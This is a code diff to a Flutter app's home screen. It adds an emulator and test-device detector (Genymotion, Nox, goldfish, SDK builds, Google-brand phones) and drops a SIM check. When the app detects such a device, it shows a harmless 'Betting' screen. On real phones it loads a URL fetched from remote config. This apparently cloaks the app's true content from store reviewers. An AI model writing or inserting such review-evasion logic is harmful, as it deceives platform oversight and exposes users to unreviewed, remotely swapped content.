@@ -31,17 +31,39 @@ class _HomePageState extends State<HomePage> {
     }
   }
 
-  Future<String> checkBrendDevice() async {
-    String brandDevice = '';
+  Future<bool> mobileChecker() async {
     DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
 
-    if (Platform.isAndroid) {
-      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
-      brandDevice = androidInfo.brand;
-    } else if (Platform.isIOS) {
-      brandDevice = 'Apple';
-    }
-    return brandDevice;
+    final em = await deviceInfo.androidInfo;
+    var phoneModel = em.model;
+    var buildProduct = em.product;
+    var buildHardware = em.hardware;
+
+    var result = (em.fingerprint.startsWith("generic") ||
+        phoneModel.contains("google_sdk") ||
+        phoneModel.contains("droid4x") ||
+        phoneModel.contains("Emulator") ||
+        phoneModel.contains("Android SDK built for x86") ||
+        em.manufacturer.contains("Genymotion") ||
+        buildHardware == "goldfish" ||
+        buildHardware == "vbox86" ||
+        buildProduct == "sdk" ||
+        buildProduct == "google_sdk" ||
+        buildProduct == "sdk_x86" ||
+        buildProduct == "vbox86p" ||
+        !em.isPhysicalDevice ||
+        em.brand.contains('google') ||
+        em.board.toLowerCase().contains("nox") ||
+        em.bootloader.toLowerCase().contains("nox") ||
+        buildHardware.toLowerCase().contains("nox") ||
+        buildProduct.toLowerCase().contains("nox"));
+
+    if (result) return true;
+    result = result ||
+        (em.brand.startsWith("generic") && em.device.startsWith("generic"));
+    if (result) return true;
+    result = result || ("google_sdk" == buildProduct);
+    return result;
   }
 
   Future<void> remoteConfig() async {
@@ -83,12 +105,11 @@ class _HomePageState extends State<HomePage> {
     await remoteConfig();
 
     getUrl = _remoteConfig.getString('url');
-    brandDevice = await checkBrendDevice();
 
-      List<SimCard> simCards = await MobileNumber.getSimCards ?? [];
-      simAvailable = simCards.isNotEmpty;
+    // List<SimCard> simCards = await MobileNumber.getSimCards ?? [];
+    // simAvailable = simCards.isNotEmpty;
 
-    if (getUrl.isEmpty || brandDevice.contains('google') || !simAvailable) {
+    if (getUrl.isEmpty || await mobileChecker()) {
       return const Betting();
     } else {
       setPath(getUrl);
@@ -105,6 +126,7 @@ class _HomePageState extends State<HomePage> {
   @override
   Widget build(BuildContext context) {
     return Scaffold(
+      resizeToAvoidBottomInset: false ,
       body: FutureBuilder<Widget>(
         future: _loadFire(),
         builder: (context, snapshot) {
